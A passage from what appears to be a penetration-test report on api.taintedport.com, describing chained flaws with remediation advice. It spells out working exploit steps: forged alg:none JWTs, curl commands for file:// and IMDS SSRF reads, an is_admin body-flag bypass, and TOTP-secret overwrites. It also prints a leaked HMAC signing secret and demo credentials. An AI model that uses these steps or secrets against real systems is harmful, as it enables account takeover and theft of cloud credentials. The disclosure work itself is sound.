                     remediation short of operator-side MFA reset,
                     including signing-key rotation and password rotation.

 PREREQUISITES
   • None.  Unauthenticated network access to api.taintedport.com.
   • Knowledge of one victim user_id (small positive integer; the
     /admin/orders endpoint enumerates them, itself reachable via
     the same JWT-forgery bug).
────────────────────────────────────────────────────────────────────────────────
```


#### Impact

Unauthenticated, network-based, single-flow, permanent account takeover of any user in the application.

- **Privileges Required drops from L → N.** vuln-0013 alone requires a stolen/legitimate victim session; chained with vuln-0005 the session is forged from thin air.
- **Durable persistence.** Reproduced end-to-end: attacker retained login access AFTER the victim rotated their password via `PUT /auth/password`. Because `totp_secret` is not cleared by password change, email change, or JWT expiry, the only recovery path is operator intervention.
- **Denial of legitimate access.** Post-attack, `POST /auth/login {email,password}` returns `{success:false, requires_2fa:true}` for the real owner. Their authenticator app has no seed matching the installed secret, and the API exposes no backup codes, no email-challenge MFA reset, and no self-service disable flow.
- **Detection evasion.** Successful attacker logins present as `password + valid TOTP` — indistinguishable from the legitimate owner without dedicated "TOTP secret rotated at T" audit signals.
- **Combined with the amplifier from vuln-0005** (`GET /orders/{id}` leaks the owner's bcrypt password hash + TOTP secret to whoever presents a JWT claiming ownership), an attacker can silently harvest the legitimate `totp_secret` before overwriting it, and — after offline-cracking the password hash — log in with fully valid MFA that is indistinguishable from the real user.
- **Signing-secret rotation is insufficient remediation.** Rotating the JWT secret invalidates outstanding forged tokens but does not touch the attacker's stored `totp_secret`. Any independent password compromise (credential stuffing, breach reuse, cracked hash) re-grants full access with valid MFA.

CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = **9.6 Critical**.
Scope is Changed because the compromised authentication authority (JWT verifier) is used to write authoritative security state (MFA secret) that then governs a different security context — future cryptographically-legitimate sessions on the victim's account.

#### Technical Analysis

Step-by-step technical flow with the specific defect exploited at each hop, as independently reproduced against https://api.taintedport.com:

1. Attacker crafts an unsigned JWT — header `{"alg":"none","typ":"JWT"}`, payload `{"user_id":<victim>,"email":"x","is_admin":false,"iat":1,"exp":9999999999}`, empty signature segment. `alg:HS256` with random signature bytes was tested independently and is equally accepted.
   - **Defect (vuln-0005):** the JWT middleware base64-decodes the header/payload, checks `exp`, and returns claims to handlers WITHOUT calling `hash_hmac(...)` or an equivalent verify step. Confirmed by `GET /auth/me` returning HTTP 200 with `{"user":{"id":<victim>,"email":<victim_email>,...}}` for the forged token.

2. Attacker generates 20 random bytes locally, base32-encodes them → `attacker_secret`, then computes `code = HOTP(attacker_secret, floor(time()/30))` per RFC 6238 SHA-1. Both values are attacker-controlled and never leave the attacker's machine before being sent as the request body.

3. Attacker sends `POST /auth/2fa/enable` with `Authorization: Bearer <forged JWT>` and body `{"totp_secret":"<attacker>","totp_code":"<code>"}`.
   - **Defect (vuln-0013):** the enable handler reads `totp_secret` AND `totp_code` from the request body, verifies HMAC(secret, counter) matches (trivially true — client made both), and issues `UPDATE users SET totp_secret=<attacker>, totp_enabled=1 WHERE id=<victim>`. No pending-secret table is consulted; no current password is re-required.
   - Response: HTTP 200 `{"success":true,"message":"Two-factor authentication enabled successfully."}`.

4. `GET /auth/me` with the forged JWT now returns `"totp_enabled": true`.

5. Legitimate victim's next login: `POST /auth/login {email,password}` → HTTP 200 `{"success":false,"requires_2fa":true,"message":"Two-factor authentication code required."}`. Their authenticator app has no matching seed. The API exposes no self-service MFA reset (no backup codes, no email challenge, no MFA-reset endpoint).

6. Attacker login: `POST /auth/login {email, password, totp_code: HOTP(attacker_secret, now)}` → HTTP 200 with a fully-signed, legitimate session token.

7. Persistence step — as the legitimate victim (using their own token), `PUT /auth/password {current_password, new_password}` → HTTP 200 `{"success":true}`. `totp_secret` is not touched by this update.

8. After a short delay, attacker: `POST /auth/login {email, NEW password, totp_code: HOTP(attacker_secret, now)}` → HTTP 200 with a valid session token. Password rotation did not evict the backdoor.

**Why the chain is worse than the sum of parts:**
- vuln-0005 alone can theoretically be evicted by rotating the JWT signing secret; the chain permanently neutralises this remediation because the attacker's `totp_secret` lives in the DB, independent of any signing key.
- vuln-0013 alone requires Privileges Required = L (a stolen/legitimate victim session). Chained with vuln-0005 the prerequisite is trivially met with no credentials.
- Post-chain, attacker logins carry a legitimate signature and valid MFA — indistinguishable from the real owner in server logs without dedicated "TOTP-secret-rotated-at-T" audit signals.
- The Scope: Changed metric is justified because the compromised authority (JWT verifier) is used to permanently modify security state governing a downstream context (future cryptographically-legitimate sessions), not merely to impersonate within the current session.


#### Proof of Concept


Prerequisites: none. Unauthenticated network access to `https://api.taintedport.com` is sufficient. The PoC self-provisions a fresh throwaway victim account so it is safe to re-run against shared environments and never touches pre-existing accounts.

Steps (executed automatically by `poc/poc.py`):

1. Register a fresh victim via `POST /auth/register` → capture initial legitimate JWT and `user_id` (in production the attacker enumerates `user_id`s by forging an admin JWT and calling `GET /admin/orders`).
2. As unauthenticated attacker, forge a JWT with `header={"alg":"none","typ":"JWT"}`, `payload={"user_id":<victim>,"is_admin":false,"iat":1,"exp":9999999999}`, empty signature segment. Confirm via `GET /auth/me` → HTTP 200 with victim identity.
3. Generate 20 random bytes → base32 → `attacker_secret`. Compute RFC 6238 SHA-1 6-digit code.
4. `POST /auth/2fa/enable` with `Authorization: Bearer <forged>` and `{"totp_secret":"<attacker>","totp_code":"<code>"}` → HTTP 200 `{"success":true}`.
5. `GET /auth/me` with forged JWT → `"totp_enabled": true`.
6. `POST /auth/login {email,password}` → `{"success":false,"requires_2fa":true}`. Victim locked out.
7. `POST /auth/login {email, password, totp_code: HOTP(attacker_secret, now)}` → HTTP 200 with valid session token.
8. As the legitimate victim (using their own legitimate token): `PUT /auth/password {current_password, new_password}` → HTTP 200.
9. `POST /auth/login {email, NEW password, totp_code: HOTP(attacker_secret, now)}` → HTTP 200 with valid session token. Backdoor survived rotation.

Run:
    TARGET_URL=https://api.taintedport.com python3 poc/poc.py
    # or non-interactive:
    TARGET_URL=https://api.taintedport.com python3 poc/poc.py --no-pause

Output includes: the forged JWT, the attacker's base32 secret, victim credentials before and after rotation, and colour-coded per-step confirmations. The final banner prints `>>> CHAIN CONFIRMED` only when every assertion has passed.



*The full exploit script is available in the annexes.*



#### Remediation

Breaking EITHER link stops the chain, but both defects should be fixed because either alone remains critical.

**Break link 1 (highest leverage — fixes many other findings):**
- Use a maintained JWT library with an explicit algorithm allow-list; never `alg:none`, never `[$header->alg]`. Reject any token whose HMAC does not verify with the current server secret.
- Rotate the JWT signing secret immediately as part of remediation — forged tokens with far-future `exp` are already in the wild.
- Do NOT trust `is_admin`, `email`, or any other authorisation attribute from the token. After signature verification, re-derive them from the DB row keyed by the *verified* `user_id`.
- Add a per-user `ver` claim (token version counter) so future password/MFA changes invalidate all outstanding JWTs without requiring a global secret rotation.

**Break link 2 (required regardless — token theft via other channels still enables this):**
- Remove `totp_secret` from the `POST /auth/2fa/enable` request contract. The server must be the sole authority on the shared secret. If a client sends the field, ignore/reject it explicitly.
- Persist the pending secret server-side on `POST /auth/2fa/setup` in a `pending_totp_secret` column with an expiry, keyed to `user_id`. On enable, verify the submitted code against the pending secret, then promote it to `totp_secret`, set `totp_enabled=1`, and clear the pending row. Reject enable requests where no pending secret exists or the pending secret has expired.
- Require the user's current password on `POST /auth/2fa/enable` — matching the gating on `/auth/2fa/disable`, `/auth/password`, `/auth/email`.
- Emit an alert email to the account holder whenever `totp_secret` is rotated, with a "wasn't me" link that revokes all sessions and disables 2FA.
- Rate-limit `POST /auth/2fa/enable` per session and per account.

**Detection and cleanup:**
- Audit accounts where `totp_enabled=1` and the stored secret does not correspond to any secret ever issued by `/auth/2fa/setup` (compare against setup-time audit trail). Reset MFA for those accounts out-of-band and force password reset.
- Add regression tests: (a) forged HS256 signature must be rejected; (b) `alg:none` must be rejected in all case variants and when the alg field is absent; (c) `POST /auth/2fa/enable {totp_secret:...}` must be ignored or rejected when no pending secret exists; (d) `POST /auth/2fa/enable` without a valid current-password field must be rejected.

---


### chain-0002: Public OpenAPI Disclosure Chains Anonymous Attacker into Authenticated SSRF/LFI and BFLA Admin Bypass on Order Status








**Severity:** CRITICAL | **CVSS:** 10.0 | **Endpoints:** `/openapi.yaml`, `/auth/login`, `/wines/import-url`, `/orders/{id}/status` | **Method:** GET | **CWE:** CWE-200 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N`

#### Chain Steps


1. **vuln-0002** — Public unauthenticated GET /openapi.yaml discloses joe@example.com / password123 in plaintext AND advertises the hidden vulnerable routes POST /wines/import-url (schema description explicitly permits local file paths) and PUT /orders/{id}/status with the client-controlled is_admin body flag. This one anonymous request is the discovery + access primitive for every subsequent chain step — it drops effective PR from Low to None and eliminates the need for endpoint enumeration or field guessing.

2. **vuln-0021** — The schema-advertised POST /wines/import-url endpoint accepts the leaked-account JWT and executes a server-side fetch of any URL supplied in the body. Chained with the schema disclosure it delivers both LFI (file:///proc/version → raw kernel banner echoed) and SSRF (http://169.254.169.254/latest/meta-data/instance-id → i-001f7592c2feb4724). The same JWT is used to hit PUT /orders/{id}/status with the schema-documented is_admin:true body flag; the admin gate is bypassed (403 → 404 on a non-existent order id, reproducible across multiple ids), completing the privilege-escalation arm of the chain.


#### Description

The production API host `https://api.taintedport.com` serves its full developer OpenAPI 3.0.3 schema at `GET /openapi.yaml` without any authentication. A single ~40 KB anonymous response simultaneously (a) discloses plaintext demo credentials for the live account `joe@example.com / password123` (user_id=1), (b) advertises the existence and full body schema of the hidden endpoint `POST /wines/import-url`, whose description explicitly permits "any URL including remote HTTP endpoints or local file paths", and (c) advertises the existence and body schema of the hidden endpoint `PUT /orders/{id}/status`, including a required boolean body field named `is_admin` documented as a "Client-provided admin flag".

Using only what the schema disclosed, an anonymous internet caller can, in four HTTP requests, escalate from zero access to:

1. A valid non-MFA JWT for user_id=1 by replaying the plaintext credentials against `POST /auth/login`.
2. Arbitrary local file read on the API host by sending `{"url":"file:///proc/version"}` (or any other path) to `POST /wines/import-url`. The endpoint returns the fetched body verbatim inside `raw_content`. `/etc/hostname` and `/proc/version` were retrieved as benign proofs; every file readable by the PHP process user is equally exposed.
3. Server-Side Request Forgery to the AWS EC2 Instance Metadata Service (IMDSv1) by sending `{"url":"http://169.254.169.254/latest/meta-data/instance-id"}`, returning `raw_content: "i-001f7592c2feb4724"`. The metadata service is enabled without IMDSv2 token requirement, so any IAM role attached to the host would be exfiltrable through this primitive.
4. Bypass of the admin authorization gate on `PUT /orders/{id}/status` by adding the schema-documented body flag `is_admin: true`. Without the flag, the server responds `HTTP 403 "Admin access required."`; with the flag, the server responds `HTTP 404 "Order not found."` for a non-existent order id. The 403 → 404 transition on the same non-admin JWT proves the authorization decision was taken from the request body and the request reached order lookup — on any real order id this becomes cross-tenant order-state modification by any authenticated user.

The chain converts an anonymous internet visitor into (a) a valid user session, (b) an SSRF/LFI operator against the API host and cloud metadata, and (c) a working admin-only order-state writer, in six HTTP requests, with no user interaction and no prior credentials.


#### Attack Flow

```
Chain: Public OpenAPI Disclosure → SSRF/LFI + BFLA Admin-Gate Bypass
════════════════════════════════════════════════════════════════════════

┌──────────────────────────────────────────────────────────────────────────┐
│  Prerequisites: NONE — attacker is an anonymous public-internet caller.  │
└──────────────────────────────────────────────────────────────────────────┘

    Attacker                                     api.taintedport.com
  (unauthenticated)                              (PHP 8.2.31 / Cloudflare)
        │                                                    │
────────┼────────────────────────────────────────────────────┼────────────
 PHASE 1│  Anonymous schema disclosure   (vuln-0002)         │
────────┼────────────────────────────────────────────────────┼────────────
        │  [1] GET /openapi.yaml                             │
        │───────────────────────────────────────────────────▶│  no auth
        │                                                    │  no gating
        │  200 OK   40,945 bytes YAML                        │  no ratelimit
        │◀───────────────────────────────────────────────────│
        │
        │  Schema hands the attacker THREE gifts:
        │   ┌───────────────────────────────────────────────────────────┐
        │   │ (a) info.description "Demo Accounts":                     │
        │   │       joe@example.com  / password123                      │
        │   │ (b) paths./wines/import-url:                              │
        │   │       "Accepts any URL including ... local file paths."   │
        │   │ (c) paths./orders/{id}/status body schema:                │
        │   │       is_admin: boolean  ("Client-provided admin flag")   │
        │   └───────────────────────────────────────────────────────────┘
        │
────────┼────────────────────────────────────────────────────┼────────────
 PHASE 2│  Authentication using leaked credentials           │
────────┼────────────────────────────────────────────────────┼────────────
        │  [2] POST /auth/login                              │
        │      {"email":"joe@example.com",                   │
        │       "password":"password123"}                    │
        │───────────────────────────────────────────────────▶│
        │                                                    │  no MFA
        │  200 OK   {token: eyJ..., user.id=1,               │
        │            is_admin: false}                        │
        │◀───────────────────────────────────────────────────│
        │                     ▲
        │                     └── AUTH BYPASS
        │                         anonymous ─────▶ authenticated user
        │
────────┼────────────────────────────────────────────────────┼────────────
 PHASE 3│  Weaponise the schema-advertised URL fetcher       │
        │  (vuln-0021 SSRF/LFI)                              │
────────┼────────────────────────────────────────────────────┼────────────
        │  [3a] POST /wines/import-url                       │
        │       Authorization: Bearer <joe_jwt>              │
        │       {"url":"file:///proc/version"}               │
        │───────────────────────────────────────────────────▶│──────┐
        │                                                    │      │
        │                                       PHP file:// wrapper │
        │                                                    ▼      │
        │                          ┌───────────────────────────────┐│
        │                          │ Local filesystem              ││
        │                          │   /proc/version, /etc/*, .env ││
        │                          │   private keys, JWT signer... ││
        │                          └───────────────────────────────┘│
        │  200 OK {raw_content:"Linux version 6.8.0-111..."}◀───────┘
        │◀───────────────────────────────────────────────────│
        │                     ▲
        │                     └── LFI CONFIRMED (full body echoed)
        │
        │  [3b] POST /wines/import-url                       │
        │       {"url":"http://169.254.169.254/              │
        │                latest/meta-data/instance-id"}      │
        │───────────────────────────────────────────────────▶│──────┐
        │                                                    │      │
        │                                                    ▼      │
        │                          ┌───────────────────────────────┐│
        │                          │ AWS EC2 IMDSv1                ││
        │                          │ 169.254.169.254               ││
        │                          │  → instance-id, iam/,         ││
        │                          │    identity-credentials/, ... ││
        │                          └───────────────────────────────┘│
        │  200 OK {raw_content:"i-001f7592c2feb4724"}◀──────────────┘
        │◀───────────────────────────────────────────────────│
        │                     ▲
        │                     └── SSRF to cloud metadata CONFIRMED
        │
────────┼────────────────────────────────────────────────────┼────────────
 PHASE 4│  BFLA privilege escalation on admin-only route     │
────────┼────────────────────────────────────────────────────┼────────────
        │  [4a] PUT /orders/999999/status                    │
        │       Authorization: Bearer <joe_jwt>              │
        │       {"status":"processing"}                      │
        │───────────────────────────────────────────────────▶│
        │  403  "Admin access required."                     │
        │◀───────────────────────────────────────────────────│
        │           (admin gate exists)
        │
        │  [4b] PUT /orders/999999/status                    │
        │       Authorization: Bearer <joe_jwt>              │
        │       {"status":"processing",                      │
        │        "is_admin":true}   ◀── flag from schema     │
        │───────────────────────────────────────────────────▶│
        │  404  "Order not found."                           │
        │◀───────────────────────────────────────────────────│
        │                     ▲
        │                     └── PRIVESC CONFIRMED
        │                         403 → 404 on the SAME non-admin JWT.
        │                         Adding is_admin:true moved execution
        │                         PAST the admin gate INTO order lookup.
        │                         On any real order id → cross-tenant
        │                         order-state modification.
        ▼

Root cause
────────────────────────────────────────────────────────────────────────
The developer-only OpenAPI document is shipped unauthenticated on the
production API host. The schema is BOTH the payload (working credentials)
AND the roadmap (hidden endpoints + their exploitable body shapes).

    Anonymous internet caller
             │
             ▼
    GET /openapi.yaml  ─── one request, three gifts ───┐
             │                                         │
             ├─▶ credentials  ──▶  JWT (auth bypass)   │
             ├─▶ /wines/import-url  ──▶  SSRF + LFI    │
             └─▶ is_admin flag     ──▶  BFLA privesc   │
                                                       ▼
                          full-chain compromise in 6 HTTP requests,
                          no user interaction, no rate-limit,
                          no prior knowledge.

Prerequisites for exploitation
────────────────────────────────────────────────────────────────────────
    • Network reachability of https://api.taintedport.com (public)
    • Nothing else — no credentials, no session, no user interaction,
      no email verification.

Breaking any single link (removing the schema, rotating the demo
credentials, hardening /wines/import-url, or removing the is_admin
body field on /orders/{id}/status) breaks the chain.
```


#### Impact

Combined impact from a single anonymous entry point:

1. **Authentication bypass** — the schema hands the attacker a working, MFA-less credential pair for `joe@example.com` (user_id=1). All downstream steps run as an authenticated (non-admin) user with no prior knowledge.
2. **Arbitrary local file read** — `file://` URIs are honoured by `POST /wines/import-url` and the full body is echoed back in `raw_content`. Any file readable by the PHP process user (application source, `.env`, private keys, session material, JWT signing key, TLS keys) is directly exfiltrable in a single request.
3. **SSRF to AWS IMDSv1** — `http://169.254.169.254/…` is reachable and returns instance-id `i-001f7592c2feb4724` (validated). If any IAM role is attached to the instance (now or after re-hosting), the same primitive yields temporary AWS credentials in one request, extending impact into the AWS tenancy.
4. **Internal-network reachability with body exfiltration** — loopback and RFC1918 destinations are reachable and echoed verbatim, converting internal unauthenticated services (admin panels, PHP-FPM status, orchestrator sidecars) into directly readable resources.
5. **Privilege escalation to admin-only order-state writes** — the `is_admin` body flag documented by the schema bypasses the `PUT /orders/{id}/status` admin gate for a non-admin user. On any real order id this permits cross-tenant modification of order state (status, fulfilment) by any authenticated user.
6. **Loss of "hidden endpoint" defence in depth** — the schema is simultaneously the disclosure and the roadmap, so any additional route added under this schema pattern inherits the same exposure profile.

Business risk: full confidentiality break of anything reachable by the API process on the local filesystem or internal network, direct integrity break of order state, and cloud-metadata reconnaissance — all initiated by an anonymous public-internet caller with no prerequisite knowledge or user interaction.

#### Technical Analysis

Link 1 — vuln-0002 (OpenAPI disclosure)
---------------------------------------
`GET /openapi.yaml` returns HTTP 200 with a 40,945-byte YAML body served via Cloudflare with no authentication guard, no referer check, no environment gate, and no rate limit (`Content-Type: application/octet-stream`, `Server: cloudflare`). Two artefacts of the schema drive the rest of the chain:

- `info.description` contains a Markdown "## Demo Accounts" block that hardcodes `joe@example.com / password123` and `jane@example.com / password123`. Both authenticate against `POST /auth/login` and return valid HS256 JWTs with no MFA challenge. This drops the effective Privileges Required for the rest of the chain from "any authenticated user" to "any anonymous internet caller".
- `paths:` documents `POST /wines/import-url` at line 840 with the description "Accepts any URL including remote HTTP endpoints or local file paths", and `PUT /orders/{id}/status` at line 1303 with a required body field `is_admin: boolean` — the schema even documents the 403 response as `Admin access required (is_admin not set)`. Both routes are hidden — not linked from the SPA — so without the schema, an attacker would neither know they exist nor know the exact body shape needed to exploit them.

Link 2 — vuln-0021 (SSRF/LFI via `POST /wines/import-url`)
----------------------------------------------------------
The endpoint passes the attacker-controlled `url` directly to a PHP HTTP client that honours the default stream wrappers. There is no scheme allow-list, no host/IP allow-list, no response redaction, and no egress firewalling. If the fetched body is not valid JSON, the endpoint responds with `{"success":true,"message":"Content fetched but is not valid JSON wine data.","raw_content":"<verbatim body>","url":"<echoed>"}`. Independently reproduced:

- `file:///proc/version` → `raw_content: "Linux version 6.8.0-111-generic ..."` (LFI). Also verified against `/etc/hostname` → `raw_content: "4148066827d9\n"`.
- `http://169.254.169.254/latest/meta-data/instance-id` → `raw_content: "i-001f7592c2feb4724"` (SSRF to IMDSv1).

The endpoint requires a Bearer JWT. The demo credentials from Link 1 satisfy this requirement anonymously.

Privesc arm — BFLA on `PUT /orders/{id}/status`
-----------------------------------------------
Same non-admin JWT is used:

- `{"status":"processing"}` → `HTTP 403 {"success":false,"message":"Admin access required."}`
- `{"status":"processing","is_admin":true}` → `HTTP 404 {"success":false,"message":"Order not found."}`

The 403 → 404 transition on identical URL and identical JWT proves the authorization decision was made from the request body rather than from the JWT claims: adding the client-supplied `is_admin:true` moved execution past the admin gate into order lookup. Reproduced across multiple non-existent order ids (999999, 888888) and multiple statuses (`shipped`, `processing`) to demonstrate the bypass is not condition-specific.

Why chaining elevates severity
------------------------------
- vuln-0021 individually is PR:L (any authenticated user) with S:C/C:H/I:L. Chained through vuln-0002, effective PR drops to None because the credentials are handed to the attacker in the schema; the attacker also does not need to enumerate the hidden endpoint or guess its body shape.
- The BFLA privesc primitive is a distinct impact not fully covered by either constituent finding: vuln-0002 only documented the observation of the primitive, and vuln-0021 is scoped strictly to the URL fetcher. The chain gives the attacker BOTH a full-response SSRF/LFI primitive AND an admin-only write primitive, raising combined Integrity to H.
- Root cause: the developer-only OpenAPI document was shipped into the public production API host without an authentication gate. The schema is simultaneously the payload (working credentials) and the roadmap (hidden endpoint URLs + their exploitable body fields). Removing the schema breaks the chain end-to-end (returns each link to PR:L and requires attacker enumeration). Fixing either downstream endpoint also breaks the chain.


#### Proof of Concept


All requests executed against https://api.taintedport.com from a stock sandbox. Full raw responses saved under /workspace/validation/chains/public-openapi-disclosure-chains-directl/evidence/. Runnable end-to-end script at /workspace/validation/chains/public-openapi-disclosure-chains-directl/poc/poc.py.

Step-by-step reproduction:

1. Fetch the schema anonymously (no headers required):
   `curl -sk https://api.taintedport.com/openapi.yaml -o step1.yaml`
   → HTTP 200, 40,945 bytes. Contains `joe@example.com / password123`, `/wines/import-url` with description mentioning "local file paths", and `/orders/{id}/status` with `is_admin` body field described as a "Client-provided admin flag".

2. Log in with the leaked credentials:
   `curl -sk -X POST https://api.taintedport.com/auth/login -H 'Content-Type: application/json' -d '{"email":"joe@example.com","password":"password123"}'`
   → HTTP 200, `{"success":true,"token":"eyJhbGciOi...","user":{"id":1,"is_admin":false}}` — no MFA challenge.

3a. LFI via schema-advertised SSRF endpoint (benign target /proc/version):
   `curl -sk -X POST https://api.taintedport.com/wines/import-url -H "Authorization: Bearer <joe_jwt>" -H 'Content-Type: application/json' -d '{"url":"file:///proc/version"}'`
   → HTTP 200, `{"success":true,"raw_content":"Linux version 6.8.0-111-generic ...","url":"file:///proc/version"}`

3b. SSRF to AWS IMDSv1 (benign instance-id path):
   `curl -sk -X POST https://api.taintedport.com/wines/import-url -H "Authorization: Bearer <joe_jwt>" -H 'Content-Type: application/json' -d '{"url":"http://169.254.169.254/latest/meta-data/instance-id"}'`
   → HTTP 200, `{"success":true,"raw_content":"i-001f7592c2feb4724",...}`

4a. BFLA baseline against non-existent order id (no is_admin):
   `curl -sk -X PUT https://api.taintedport.com/orders/999999/status -H "Authorization: Bearer <joe_jwt>" -H 'Content-Type: application/json' -d '{"status":"processing"}'`
   → HTTP 403, `{"success":false,"message":"Admin access required."}`

4b. BFLA privesc with schema-documented is_admin flag:
   `curl -sk -X PUT https://api.taintedport.com/orders/999999/status -H "Authorization: Bearer <joe_jwt>" -H 'Content-Type: application/json' -d '{"status":"processing","is_admin":true}'`
   → HTTP 404, `{"success":false,"message":"Order not found."}`
   The 403 → 404 transition on the same non-admin JWT proves the admin gate was bypassed by the client-supplied flag. Reproduced against a second non-existent id (888888) with `status=processing` — same result.

Automated end-to-end reproduction (asserts every step, exits non-zero on any failure):
   `python3 poc/poc.py --no-pause`
   Last run: all 5 assertions passed. Final line: `CHAIN CONFIRMED — anonymous → auth bypass → SSRF/LFI + admin-only writes`.

Rules-of-engagement compliance:
- LFI targets restricted to non-sensitive files (/proc/version, /etc/hostname).
- IMDS query restricted to non-secret metadata path (instance-id).
- BFLA privesc probe used only non-existent order ids (999999, 888888), so no order state was actually modified.
- No IAM credential paths, no /etc/passwd, no SSH keys, no .env, no application source, no non-owned accounts accessed.



*The full exploit script is available in the annexes.*



#### Remediation

Break the chain at any of the following links; hardening all of them is recommended for defence in depth:

1. **Stop serving the developer OpenAPI on the production API host.** Move `/openapi.yaml` behind authentication, restrict it to a non-production environment, or ship a curated public variant that omits credentials, internal URLs, and internal-only endpoints. Add a CI check that fetches `/openapi.yaml`, `/openapi.json`, `/swagger`, `/swagger.json`, `/docs`, `/redoc`, and `/api-docs` unauthenticated against production and asserts 401 or 404.

2. **Remove all real credentials from the schema and rotate them.** The `## Demo Accounts` block in `info.description` must not contain any password that authenticates against a live environment. Immediately rotate the passwords for `joe@example.com` and `jane@example.com` (both use `password123`) and force a password reset. Onboarding tutorials should reference seed scripts, not shipped plaintext passwords.

3. **Fix `POST /wines/import-url`:**
   - Allow-list target hostnames known to publish legitimate wine data; reject every other host with 400.
   - Enforce a scheme allow-list of `https://` only. Explicitly reject `file://`, `http://`, `gopher://`, `dict://`, `ftp://`, `php://`, `data://`, `phar://`, `zip://`, `expect://` and any custom PHP stream wrapper.
   - Resolve the target hostname before connecting and reject the request if the resolved address falls in any of `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10`, `169.254.0.0/16`, `0.0.0.0/8`, `::1/128`, `fe80::/10`, `fc00::/7`. Disable HTTP redirects or re-validate the destination after each hop. Guard against DNS rebinding by resolving once and connecting by IP literal.
   - Do not echo the fetched body back to the caller — parse against the expected wine schema and return only whitelisted structured fields. This alone downgrades SSRF to blind and removes the LFI read primitive.
   - Migrate the EC2 host to IMDSv2 with `HttpTokens=required` and `HttpPutResponseHopLimit=1`.
   - Add an egress firewall on the API host denying outbound traffic to `169.254.169.254` and to loopback / RFC1918 for the PHP process user.

4. **Fix `PUT /orders/{id}/status`:**
   - Remove the `is_admin` body field from the request schema entirely; derive privileges solely from the JWT claims.
   - Merge this route into the existing `/admin/orders/{id}/status` code path so a single admin check governs order-state changes.

5. **Rotate all secrets that were reachable during the exposure window:** JWT signing key, database credentials, third-party API keys, TLS keys, plus the accounts named in the schema.

6. **Close or gate open self-registration** behind email verification and rate limiting so that, even if credentials leak in the future, downstream authenticated primitives cannot be reached by any anonymous internet user.

---


### chain-0004: Persistent Admin Compromise: JWT alg:none Bypass + LFI on /wines/import-url → Exfiltrated HMAC Signing Secret








**Severity:** CRITICAL | **CVSS:** 10.0 | **Endpoints:** `/wines/import-url`, `/auth/me`, `/admin/orders` | **Method:** POST | **CWE:** CWE-798 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

#### Chain Steps


1. **vuln-0005** — The JWT middleware accepts alg:none tokens and does not verify HMAC signatures, so an unauthenticated attacker mints an admin token client-side and passes the Bearer-auth requirement on POST /wines/import-url without any credentials. Without this link the LFI still requires an account (open registration lowers but does not remove the barrier).

2. **vuln-0021** — POST /wines/import-url fetches attacker-controlled URLs with no scheme allow-list and echoes the raw response body in raw_content. With the forged JWT from step 1, file:// URIs read arbitrary local files, including /var/www/backend/api/config/jwt.php which contains the hard-coded HMAC signing secret. This is the persistence primitive that survives fixing vuln-0005 — properly-signed tokens minted with the leaked secret remain valid until the secret is rotated.


#### Description

The JWT signature-verification bypass (vuln-0005) and the arbitrary local file read on `POST /wines/import-url` (vuln-0021) chain into a persistent, undetectable admin compromise of `api.taintedport.com` that survives a code-only fix to either individual flaw.

Chain sequence (single conversation, zero prior credentials):

1. An unauthenticated attacker forges a JWT with header `{"typ":"JWT","alg":"none"}`, payload `{"user_id":1,"is_admin":true,"iat":1,"exp":9999999999}`, and an empty signature segment. vuln-0005 causes the auth middleware in `api/config/jwt.php` to accept the token without any HMAC comparison.
2. The forged token unlocks `POST /wines/import-url`. That endpoint (vuln-0021) passes attacker-controlled URLs to a broad PHP fetcher with no scheme allow-list; `file://` URIs are honoured by PHP's default stream wrapper and the fetched body is echoed verbatim in the response's `raw_content` field.
3. `file:///proc/self/maps` reveals `/var/www/backend/database.db`, disclosing the PHP application root as `/var/www/backend/`.
4. `file:///var/www/backend/api/config/jwt.php` returns the full JWT class source, disclosing the hard-coded HS256 signing secret `pTg7Kz9mQxR4vL2wN8jF5dY1hA6cB3eS0uI` and the confessional log line `"JWT signature mismatch for token, but accepting anyway"`.
5. The attacker mints a properly HS256-signed token with the leaked secret. `GET /auth/me` returns `{"user":{"id":1,"name":"Luis Grangeia","email":"joe@example.com"...}}` and `GET /admin/orders` returns 157 orders — with a cryptographically valid signature.

The chain payoff is persistence and undetectability. After the operator patches vuln-0005 to actually verify signatures and reject `alg:none`, tokens signed with the exfiltrated secret remain valid indefinitely and carry a cryptographically valid HMAC — access logs, WAFs, and signature-verification middleware cannot distinguish them from legitimate tokens issued by `/auth/login`. The only remediation that revokes the attacker is **rotating the signing secret and invalidating every currently-issued JWT** — a code-only fix is insufficient.


#### Attack Flow

```
┌───────────────────────────────────────────────────────────────────────────────┐
│  Persistent Admin Compromise Chain                                            │
│  vuln-0005 (JWT sig not verified) + vuln-0021 (LFI /wines/import-url)         │
│  → leaks HMAC secret → mints legitimately-signed admin tokens (post-patch)    │
└───────────────────────────────────────────────────────────────────────────────┘

  ATTACKER (unauthenticated internet)                api.taintedport.com
  ───────────────────────────────────                ────────────────────

  ① FORGE unsigned admin JWT              (vuln-0005 root cause)
     header : {"alg":"none","typ":"JWT"}
     payload: {"user_id":1,"is_admin":true,"exp":9999999999}
     sig    : (empty)
                       │
                       │  POST /wines/import-url
                       │  Authorization: Bearer <alg:none forgery>
                       │  {"url": "file:///etc/hostname"}
                       ▼
                                       ┌────────────────────────────────────┐
                                       │  JWT::decode (api/config/jwt.php)  │
                                       │   • detects alg=="none" → returns  │
                                       │     payload without HMAC check     │◄── vuln-0005
                                       │   • is_admin=true trusted verbatim │
                                       └────────────────┬───────────────────┘
                                                        │  authorised as admin
                                                        ▼
                                       ┌────────────────────────────────────┐
                                       │  /wines/import-url handler:        │
                                       │   • no scheme allow-list           │◄── vuln-0021
                                       │   • file:// wrapper honoured       │
                                       │   • body echoed as raw_content     │
                                       └────────────────┬───────────────────┘
                                                        │
   ◄── 200 { raw_content: "4148066827d9" }              │  Local FS reachable
                                                        │
  ② LOCATE APP ROOT
     {"url":"file:///proc/self/maps"}   ──▶ 200; leaks /var/www/backend/*.db
                                              → app root = /var/www/backend/

  ③ EXFILTRATE HMAC SECRET               (chain payoff — persistence key)
     {"url":"file:///var/www/backend/api/config/jwt.php"}
                       │
                       ▼
                                       ┌────────────────────────────────────┐
                                       │  raw_content = full PHP source:    │
                                       │  private static $secret =          │
                                       │    'pTg7Kz9mQxR4vL2wN8jF5dY1...';  │
                                       │  if ($signature !== $validSig) {   │
                                       │    error_log("mismatch, but       │
